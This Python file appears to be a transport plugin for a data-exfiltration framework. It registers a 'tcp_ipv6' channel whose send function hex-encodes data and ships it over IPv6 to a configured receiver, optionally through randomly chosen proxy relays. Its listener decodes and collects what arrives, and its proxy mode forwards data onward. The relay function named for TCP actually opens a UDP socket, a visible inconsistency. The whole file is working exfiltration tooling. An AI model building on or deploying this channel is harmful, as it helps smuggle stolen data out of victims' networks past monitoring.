from binascii import hexlify, unhexlify
import socket
import sys
from random import choice

if not socket.has_ipv6:
    raise Exception("the local machine has no IPv6 support enabled")

config = None
app_exfiltrate = None

def send(data):
    if 'proxies' in config and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[tcp_ipv6] Sending {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    client_socket.connect((target, port))
    client_socket.send(hexlify(data.encode()))
    client_socket.close()

def listen():
    app_exfiltrate.log_message('info', "[tcp_ipv6] Waiting for connections...")
    sniff(handler=app_exfiltrate.retrieve_data)

def sniff(handler):
    port = config['port']
    server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sockaddr = ('::', port)
    try:
        server_socket.bind(sockaddr)
    except PermissionError:
        app_exfiltrate.log_message('warning', f"[tcp_ipv6] cannot bind on port {port}: PermissionError")
        sys.exit()
    server_socket.listen(1)
    app_exfiltrate.log_message('info', "[tcp_ipv6] Starting server on interface '::1' and port {}...".format(port))
    while True:
        conn, addr = server_socket.accept()
        # print ('Server: Connected by', addr)
        app_exfiltrate.log_message('info', "[tcp_ipv6] Client {} connected and sending data...".format(addr))
        data = conn.recv(4096)
        handler(unhexlify(data).decode())
        conn.send(data)
        conn.close()

def relay_tcp_packet(data):
    target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[proxy] [tcp_ipv6] Relaying {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    client_socket.connect((target, port))
    client_socket.send(hexlify(data.encode()))
    client_socket.close()

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [tcp_ipv6] Waiting for connections...")
    sniff(handler=relay_tcp_packet)

class Plugin:

    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_plugin('tcp_ipv6', {'send': send, 'listen': listen, 'proxy': proxy})
